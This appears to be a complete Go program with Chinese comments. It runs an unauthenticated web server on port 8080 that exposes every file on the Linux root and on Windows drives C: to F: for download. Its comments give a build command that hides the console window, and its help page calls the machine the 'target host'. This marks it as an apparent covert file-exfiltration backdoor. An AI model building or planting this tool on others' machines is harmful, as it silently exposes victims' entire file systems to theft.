package main

import (
	"fmt"
	"net/http"
	"os"
)

//交叉编译命令:目标windows32位:隐藏终端窗口: env GOOS=windows GOARCH=386 go build  -ldflags -H=windowsgui fileserver.go

func main() {

	http.HandleFunc("/", sayhello)
	http.HandleFunc("/quit", quit)
	http.Handle("/root/", http.StripPrefix("/root/", http.FileServer(http.Dir("/"))))
	http.Handle("/c/", http.StripPrefix("/c/", http.FileServer(http.Dir("C:\\"))))
	http.Handle("/d/", http.StripPrefix("/d/", http.FileServer(http.Dir("D:\\"))))
	http.Handle("/e/", http.StripPrefix("/e/", http.FileServer(http.Dir("E:\\"))))
	http.Handle("/f/", http.StripPrefix("/f/", http.FileServer(http.Dir("F:\\"))))

	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		fmt.Println(err)
	}

}

func quit(w http.ResponseWriter, r *http.Request) {
	fmt.Println("退出...")
	os.Exit(0)
}

func sayhello(w http.ResponseWriter, r *http.Request) {

	fmt.Println("首页...")

	fmt.Fprintf(w, `
	
		http://目标主机IP:8080       (显示本提示页) (注意:未命中的地址都会显示本页!!!)
		http://目标主机IP:8080/c     (WINDOWS 的 C:盘)
		http://目标主机IP:8080/d     (WINDOWS 的 D:盘)
		http://目标主机IP:8080/root  (LINUX 的根目录)
		http://目标主机IP:8080/quit  (退出WEB服务)
		已知类型文件可以直接打开显示,或者通过"另存为..."来下载. 未知类型文件可以直接下载保存.
	
	`) //这个写入到w的是输出到客户端的
}
